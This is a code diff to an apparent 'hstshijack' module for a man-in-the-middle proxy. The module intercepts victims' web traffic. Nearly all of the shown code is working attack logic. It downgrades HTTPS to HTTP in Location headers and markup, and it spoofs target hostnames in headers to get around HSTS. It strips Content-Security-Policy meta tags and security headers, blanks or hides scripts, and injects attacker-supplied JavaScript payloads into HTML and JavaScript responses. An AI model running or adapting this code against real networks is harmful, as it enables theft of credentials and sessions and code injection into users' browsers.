@@ -456,9 +456,9 @@ function configure() {
       }
 
       if (payloads[payload_host]) {
-        payloads[payload_host] = payloads[payload_host] + "\n" + payload;
+        payloads[payload_host] = payloads[payload_host] + "\n" + payload + "\n";
       } else {
-        payloads[payload_host] = payload;
+        payloads[payload_host] = payload + "\n";
       }
     }
   }
@@ -794,8 +794,6 @@ function onRequest(req, res) {
 }
 
 function onResponse(req, res) {
-  res.ReadBody();
-
   /* Remember HTTPS redirects. */
   location = res.GetHeader("Location", "");
   if (location.match(/^https:\/\//i)) {
@@ -857,41 +855,16 @@ function onResponse(req, res) {
       }
     }
 
-    /* Manipulate response body. */
+    /* Spoof markup bodies. */
     if (
-         res.ContentType.match(/[a-z]+\/html/i)
-      || res.ContentType.match(/[a-z]+\/javascript/i)
-      || req.Path.match(/\.html$/i)
-      || req.Path.match(/\.js$/i)
+         res.ContentType.match(/text[/](?:html|xml)|application[/](?:hta|xhtml[+]xml|xml)/i)
+      || req.Path.match(/[.](?:html|htm|xml|xhtml|xhtm|xht|hta)$/i)
     ) {
-      /* SSLstrip meta tag redirection. */
-      meta_tags = res.Body.match(/<meta (?:.{0,1000})http\-equiv=(?:\'|\"|)refresh(?:\'|\"|)(?:.{0,1000})>/ig) || null;
-      if (meta_tags != null) {
-        for (a = 0; a < meta_tags.length; a++) {
-          log_debug(on_blue + "hstshijack" + reset + " Found " + meta_tags.length + " meta tag(s) in the response body.");
-
-          if (meta_tags[a].match(/https:\/\//ig)) {
-            replacement = meta_tags[a].replace(/(http)s:\/\//ig, "$1://");
-            res.Body.replace(meta_tags[a], replacement);
-            log_debug(on_blue + "hstshijack" + reset + " Stripped meta tag(s) from SSL.");
-          }
-
-          /* Hijack hostnames in redirecting meta tags. */
-          for (b = 0; b < target_hosts.length; b++) {
-            regexp_set = toRegexpSet(target_hosts[b], replacement_hosts[b]);
-            if (meta_tags[a].match(regexp_set[0])) {
-              hijacked_meta_tag = meta_tags[a].replace(regexp_set[0], regexp_set[1]);
-              res.Body = res.Body.replace(meta_tags[a], hijacked_meta_tag);
-              log_debug(on_blue + "hstshijack" + reset + " Hijacked meta tag by replacing " + bold + target_hosts[b] + reset + " with " + bold + replacement_hosts[b] + reset + ".");
-              break;
-            }
-          }
-        }
-      }
+      res.ReadBody();
 
       /* Prevent meta tag induced CSP restrictions. */
       res.Body = res.Body.replace(
-        /<meta (?:[^>]+ )?http-equiv=['"]?Content-Security-Policy['"]?(?: [^>]+)?>/ig,
+        / http-equiv=['"]?Content-Security-Policy['"]?/ig,
         "");
 
       /* Block scripts. */
@@ -900,15 +873,9 @@ function onResponse(req, res) {
              block_script_hosts[a] != "*"
           || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])
         ) {
-          res.Body = res.Body.replace(/<script( [^>]*|)>/ig, "<div style=\"display:none;\">");
+          res.Body = res.Body.replace(/<script(?: [^>]*?)?>/ig, "<div style=\"display:none;\">");
           res.Body = res.Body.replace(/<\/script>/ig, "</div>");
-          if (
-               res.ContentType.match(/[a-z]+\/javascript/i)
-            || req.Path.match(/\.js$/i)
-          ) {
-            res.Body = "";
-          }
-          log_debug(on_blue + "hstshijack" + reset + " Blocked script(s) from " + bold + req.Hostname + reset + ".");
+          log_debug(on_blue + "hstshijack" + reset + " Blocked inline script tags in a document from " + bold + req.Hostname + reset + ".");
           break;
         }
       }
@@ -921,47 +888,64 @@ function onResponse(req, res) {
              injecting_host == "*"
           || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])
         ) {
-          injection = payload_container_prefix + payloads[injecting_host] + payload_container_suffix;
+          injection = injection + payloads[injecting_host];
+        }
+      }
+      if (injection != "") {
+        res.Body = 
+          "<script>\n" +
+          payload_container_prefix + injection + payload_container_suffix +
+          "</script>\n" +
+          res.Body;
+        log_debug(on_blue + "hstshijack" + reset + " Injected document from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
+      }
+    }
+
+    /* Spoof JavaScript bodies. */
+    if (
+         res.ContentType.match(/\w+[/]javascript/i)
+      || req.Path.match(/[.]js$/i)
+    ) {
+      res.ReadBody();
+
+      /* Block scripts. */
+      for (a = 0; a < block_script_hosts.length; a++) {
+        if (
+             block_script_hosts[a] != "*"
+          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])
+        ) {
+          res.Body = "";
+          log_debug(on_blue + "hstshijack" + reset + " Cleared JavaScript resource from " + bold + req.Hostname + reset + ".");
           break;
         }
       }
 
+      /* Inject payloads. */
+      injection = "";
+      for (a = 0; a < Object.keys(payloads).length; a++) {
+        injecting_host = Object.keys(payloads)[a];
+        if (
+             injecting_host == "*"
+          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])
+        ) {
+          injection = injection + payloads[injecting_host];
+        }
+      }
       if (injection != "") {
-        /* Inject JavaScript files. */
-        if (
-             res.ContentType.match(/[a-z]+\/javascript/i)
-          || req.Path.match(/\.js$/i)
-        ) {
-          res.Body = injection + res.Body;
-          log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
-        }
-
-        /* Inject HTML files and sslstrip. */
-        if (
-             res.ContentType.match(/[a-z]+\/html/i)
-          || req.Path.match(/\.html$/i)
-        ) {
-          res.Body =
-            "<script>\n" + injection + "</script>\n" +
-            res.Body.replace(/( (?:src|href|action)=(?:"|'|)http)s:/ig, "$1:");
-          log_debug(on_blue + "hstshijack" + reset + " Injected HTML file from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
-        }
+        res.Body = payload_container_prefix + injection + payload_container_suffix + res.Body;
+        log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
       }
     }
 
-    /* Strip SSL from location header. */
-    location = res.GetHeader("Location", "");
-    if (location != "") {
-      stripped_location = location.replace(/(http)s:\/\//i, "$1://").replace(/:443($|[/?#])/, "$1");
-      res.SetHeader("Location", stripped_location);
-      log_debug(on_blue + "hstshijack" + reset + " Stripped SSL from location header.");
-    }
+    /* Strip SSL from location headers. */
+    res.Headers = res.Headers
+      .replace(/(http)s:/ig, "$1:")
+      .replace(/:443($|[^0-9])/g, "$1");
 
-    /* Hijack hosts in headers. */
+    /* Spoof hosts in headers. */
     for (a = 0; a < target_hosts.length; a++) {
       regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);
       res.Headers = res.Headers.replace(regexp_set[0], regexp_set[1]);
-      break;
     }
 
     /* Remove security headers. */
